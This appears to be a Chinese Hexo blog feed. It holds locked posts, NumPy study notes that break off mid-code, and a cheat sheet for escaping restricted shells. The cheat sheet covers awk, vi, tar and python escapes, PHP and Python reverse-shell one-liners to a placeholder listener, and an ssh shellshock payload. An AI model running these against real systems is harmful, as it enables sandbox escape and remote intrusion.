        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dae48b450b2ecc7052c68b5406765fda08b66e5c8f804f3751af3abbe0ed7736"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RestrictedShell</title>
      <link href="/p/1712bfa8.html"/>
      <url>/p/1712bfa8.html</url>
      
        <content type="html"><![CDATA[<p>Restricted Shell是受限shell环境，所谓受限shell环境，指的是一个会阻止/限制某些命令（如cd、ls、echo等）或“阻止”SHELL、PATH、USER等环境变量的shell环境。有些时候，受限shell环境可能会阻止重定向输出操作符如&gt;，&gt;&gt;，或者其他使用这些重定向的命令。实际上，常见的受限shell环境类型包括rbash、rksh和rsh。</p><h1 id="可用命令绕过"><a href="#可用命令绕过" class="headerlink" title="可用命令绕过"></a>可用命令绕过</h1><h2 id="字符绕过"><a href="#字符绕过" class="headerlink" title="/字符绕过"></a><code>/</code>字符绕过</h2><p>不被运行的情况</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210103715084.png" alt="image-20211210103715084"></p><p>允许情况：直接输入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure><h2 id="cp命令绕过"><a href="#cp命令绕过" class="headerlink" title="cp命令绕过"></a>cp命令绕过</h2><p>可以直接复制/bin/bash到本用户目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash bash1</span><br><span class="line">./bash1</span><br><span class="line">cp /bin/sh sh1</span><br><span class="line">./sh1</span><br></pre></td></tr></table></figure><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210134151598.png" alt="image-20211210134151598"></p><h2 id="less-more"><a href="#less-more" class="headerlink" title="less/more"></a>less/more</h2><p>在末行模式直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">! &#x27;sh&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210140813076.png" alt="image-20211210140813076"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210140915460.png" alt="image-20211210140915460"></p><h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p>先执行man 不能显示完全，直接输入<code>!/bin/bash</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210142059834.png" alt="image-20211210142059834"></p><blockquote><p>git help status 同理</p></blockquote><h1 id="可用软件绕过"><a href="#可用软件绕过" class="headerlink" title="可用软件绕过"></a>可用软件绕过</h1><h2 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi/vim"></a>vi/vim</h2><p>在末行模式输入：<code>set shell=/bin/bash</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210112621431.png" alt="image-20211210112621431"></p><p>在末行模式执行：<code>shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export -p</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210113722958.png" alt="image-20211210113722958"></p><p>修改PATH</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</span><br></pre></td></tr></table></figure><blockquote><p>PATH和SHELL变量很可能是’-rx’，这意味着你只能执行不能写入，如果可写，你就可以直接写入/bin/<strong>bash</strong></p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211209175427171.png" alt="image-20211209175427171"></p><h2 id="ed编辑器"><a href="#ed编辑器" class="headerlink" title="ed编辑器"></a>ed编辑器</h2><p>先执行<code>ed</code>再执行<code>&#39;/bin/bash&#39;</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210114635605.png" alt="image-20211210114635605"></p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c/bin/bash&quot;</span><br></pre></td></tr></table></figure><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash</span><br></pre></td></tr></table></figure><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp &gt; !/bin/sh</span><br></pre></td></tr></table></figure><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb &gt; !/bin/sh</span><br></pre></td></tr></table></figure><h1 id="可用编程语言绕过"><a href="#可用编程语言绕过" class="headerlink" title="可用编程语言绕过"></a>可用编程语言绕过</h1><h2 id="expect"><a href="#expect" class="headerlink" title="expect"></a>expect</h2><p>执行<code>expect</code> 然后执行<code>sh</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210135444692.png" alt="image-20211210135444692"></p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><p>先执行<code>lua</code>再执行<code>os.execute(&#39;/bin/sh&#39;)</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210135752705.png" alt="image-20211210135752705"></p><h1 id="反弹shell绕过"><a href="#反弹shell绕过" class="headerlink" title="反弹shell绕过"></a>反弹shell绕过</h1><p>php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;LISTENING IP&quot;,LISTENING PORT);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><h1 id="ssh绕过"><a href="#ssh绕过" class="headerlink" title="ssh绕过"></a>ssh绕过</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh username@IP - t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;</span><br><span class="line">ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (shellshock)</span><br><span class="line">ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美少妇日记</title>
      <link href="/p/a32d047c.html"/>
      <url>/p/a32d047c.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="23464ad5b764f8b20711135b8d8c18f955d4f40a2412122e0bafb064664f9613"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Numpy学习</title>
      <link href="/p/6c51f6e8.html"/>
      <url>/p/6c51f6e8.html</url>
      
        <content type="html"><![CDATA[<p>NumPy（Numerical Python）是Python的一种开源的数值计算扩展。这种工具可用来存储和处理大型矩阵，比Python自身的嵌套列表（nested list structure)结构要高效的多（该结构也可以用来表示矩阵（matrix）），支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。</p><p>以下记录自己学习NumPy的笔记。</p><h1 id="numpy-array基础"><a href="#numpy-array基础" class="headerlink" title="numpy.array基础"></a>numpy.array基础</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure><h2 id="python-list的特点"><a href="#python-list的特点" class="headerlink" title="python list的特点"></a>python list的特点</h2><p>不对类型做具体的限定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">L = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">L --&gt; [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line">L[<span class="number">5</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">L --&gt; [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="string">&#x27;test&#x27;</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure><blockquote><p>python中限定只能存储一种类型的数组如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> array</span><br><span class="line">arr = array.array(<span class="string">&#x27;i&#x27;</span>, [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line">arr --&gt; array(<span class="string">&#x27;i&#x27;</span>, [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br></pre></td></tr></table></figure><h2 id="numpy-array"><a href="#numpy-array" class="headerlink" title="numpy.array"></a>numpy.array</h2><p>基础操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">nparr = np.array([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">10</span>)])</span><br><span class="line">npar --&gt; rarray([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br><span class="line"><span class="comment"># 查看存储类型</span></span><br><span class="line">nparr.dtype --&gt; dtype(<span class="string">&#x27;int32&#x27;</span>)</span><br><span class="line">nparr[<span class="number">5</span>] = <span class="number">10.5</span></span><br><span class="line">nparr --&gt; array([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>])</span><br></pre></td></tr></table></figure><blockquote><p>int定义浮点会自动去位</p></blockquote><h3 id="创建0数组或0矩阵"><a href="#创建0数组或0矩阵" class="headerlink" title="创建0数组或0矩阵"></a>创建0数组或0矩阵</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">np.zeros(<span class="number">10</span>).dtype</span><br><span class="line">--&gt; array([<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]) --&gt; dtype(<span class="string">&#x27;float64&#x27;</span>)</span><br><span class="line">np.zeros(<span class="number">10</span>, dtype=<span class="built_in">int</span>)</span><br><span class="line"><span class="comment">## 创建全为0矩阵</span></span><br><span class="line">np.zeros((<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">array([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]])</span><br><span class="line"><span class="comment">## 创建全为1矩阵</span></span><br><span class="line">np.ones(shape=(<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>]])</span><br></pre></td></tr></table></figure><h3 id="创建指定数字的矩阵"><a href="#创建指定数字的矩阵" class="headerlink" title="创建指定数字的矩阵"></a>创建指定数字的矩阵</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">np.full(shape=(<span class="number">3</span>, <span class="number">5</span>), fill_value=<span class="number">666.</span>)</span><br><span class="line">array([[<span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>],</span><br><span class="line">       [<span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>],</span><br><span class="line">       [<span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>, <span class="number">666.</span>]]</span><br></pre></td></tr></table></figure><h2 id="arange-调用list创建矩阵"><a href="#arange-调用list创建矩阵" class="headerlink" title="arange 调用list创建矩阵"></a>arange 调用list创建矩阵</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure><blockquote><p>起始，终止（左闭右开），步长</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.arange(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0.2</span>) </span><br><span class="line">--&gt; array([<span class="number">0.</span> , <span class="number">0.2</span>, <span class="number">0.4</span>, <span class="number">0.6</span>, <span class="number">0.8</span>])</span><br></pre></td></tr></table></figure><h2 id="linspace-在范围内（包含前后），截取x个数"><a href="#linspace-在范围内（包含前后），截取x个数" class="headerlink" title="linspace 在范围内（包含前后），截取x个数"></a>linspace 在范围内（包含前后），截取x个数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.linspace(<span class="number">0</span>, <span class="number">20</span>, <span class="number">10</span>)</span><br><span class="line">--&gt; array([ <span class="number">0.</span>        ,  <span class="number">2.22222222</span>,  <span class="number">4.44444444</span>,  <span class="number">6.66666667</span>,  <span class="number">8.88888889</span>,</span><br><span class="line">       <span class="number">11.11111111</span>, <span class="number">13.33333333</span>, <span class="number">15.55555556</span>, <span class="number">17.77777778</span>, <span class="number">20.</span>        ])</span><br></pre></td></tr></table></figure><h2 id="生成随机数（左闭右开）"><a href="#生成随机数（左闭右开）" class="headerlink" title="生成随机数（左闭右开）"></a>生成随机数（左闭右开）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">np.random.randint(<span class="number">4</span>, <span class="number">8</span>, <span class="number">10</span>)</span><br><span class="line">--&gt; array([<span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">4</span>])</span><br><span class="line"><span class="comment">## 随机矩阵</span></span><br><span class="line">np.random.randint(<span class="number">4</span>, <span class="number">8</span>, size=(<span class="number">3</span>,<span class="number">5</span>))</span><br></pre></td></tr></table></figure><p>指定随机种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">np.random.seed(<span class="number">666</span>) </span><br><span class="line">np.random.randint(<span class="number">4</span>, <span class="number">8</span>, size=<span class="number">10</span>)</span><br><span class="line">--&gt; array([<span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">np.random.seed(<span class="number">666</span>)</span><br><span class="line">np.random.randint(<span class="number">4</span>, <span class="number">8</span>, size=<span class="number">10</span>)</span><br><span class="line">--&gt; array([<span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br></pre></td></tr></table></figure><p>随机浮点数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.random.random((<span class="number">3</span>,<span class="number">5</span>))</span><br></pre></td></tr></table></figure><p>符合正态分布的随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.random.normal()</span><br></pre></td></tr></table></figure><h2 id="数组的基本属性"><a href="#数组的基本属性" class="headerlink" title="数组的基本属性"></a>数组的基本属性</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X = np.arange(<span class="number">15</span>).reshape(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>]])</span><br></pre></td></tr></table></figure><h3 id="查看数组维度"><a href="#查看数组维度" class="headerlink" title="查看数组维度"></a>查看数组维度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X.ndim --&gt; <span class="number">2</span></span><br><span class="line">X.shape --&gt; (<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">X.size --&gt; <span class="number">15</span></span><br></pre></td></tr></table></figure><h3 id="数组读取数据"><a href="#数组读取数据" class="headerlink" title="数组读取数据"></a>数组读取数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">X[<span class="number">2</span>,<span class="number">2</span>] --&gt; <span class="number">12</span></span><br><span class="line">X[:<span class="number">2</span>, :<span class="number">3</span>] <span class="comment">##前两行前三列</span></span><br><span class="line">--&gt; array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">       [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]])</span><br><span class="line">X[::-<span class="number">1</span>] --&gt; <span class="comment">## 倒行</span></span><br><span class="line">array([[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>],</span><br><span class="line">       [ <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">       [ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>]])</span><br><span class="line">X[::, ::-<span class="number">1</span>] --&gt; <span class="comment">##倒列</span></span><br><span class="line">array([[ <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>,  <span class="number">1</span>,  <span class="number">0</span>],</span><br><span class="line">       [ <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">5</span>],</span><br><span class="line">       [<span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>]])</span><br><span class="line">X[::-<span class="number">1</span>, ::-<span class="number">1</span>] --&gt; <span class="comment">##行列都倒</span></span><br><span class="line">array([[<span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>],</span><br><span class="line">       [ <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">5</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>,  <span class="number">1</span>,  <span class="number">0</span>]])</span><br><span class="line">X[::-<span class="number">2</span>] --&gt; <span class="comment">##倒着输出两行</span></span><br><span class="line">array([[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>],</span><br><span class="line">       [ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>]])</span><br></pre></td></tr></table></figure><blockquote><p>numpy分片没有创建新矩阵，修改子矩阵会修改原矩阵</p></blockquote><p>构造不相关的子矩阵，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subX = X[:<span class="number">2</span>, :<span class="number">3</span>].copy()</span><br></pre></td></tr></table></figure><h2 id="Reshape升维"><a href="#Reshape升维" class="headerlink" title="Reshape升维"></a>Reshape升维</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">10</span>)</span><br><span class="line">x.shape --&gt; (<span class="number">10</span>,)</span><br><span class="line">x.reshape(<span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line">--&gt;array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">       [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]])</span><br><span class="line">B = x.reshape(<span class="number">1</span>, <span class="number">10</span>) --&gt; array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]])</span><br><span class="line">B.shape --&gt; (<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">x.reshape(<span class="number">10</span>, -<span class="number">1</span>) <span class="comment">## 只划分10行，不关心每行几个元素</span></span><br><span class="line">--&gt; array([[<span class="number">0</span>],</span><br><span class="line">       [<span class="number">1</span>],</span><br><span class="line">       [<span class="number">2</span>],</span><br><span class="line">       [<span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>],</span><br><span class="line">       [<span class="number">5</span>],</span><br><span class="line">       [<span class="number">6</span>],</span><br><span class="line">       [<span class="number">7</span>],</span><br><span class="line">       [<span class="number">8</span>],</span><br><span class="line">       [<span class="number">9</span>]])</span><br><span class="line">x.reshape(-<span class="number">1</span>, <span class="number">5</span>) <span class="comment">## 只划分5列，不关心有几行</span></span><br></pre></td></tr></table></figure><h1 id="矩阵的合并与分割"><a href="#矩阵的合并与分割" class="headerlink" title="矩阵的合并与分割"></a>矩阵的合并与分割</h1><h2 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">y = np.array([<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="向量合并"><a href="#向量合并" class="headerlink" title="向量合并"></a>向量合并</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.concatenate([x,y])</span><br><span class="line">--&gt; array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="二维数组合并"><a href="#二维数组合并" class="headerlink" title="二维数组合并"></a>二维数组合并</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 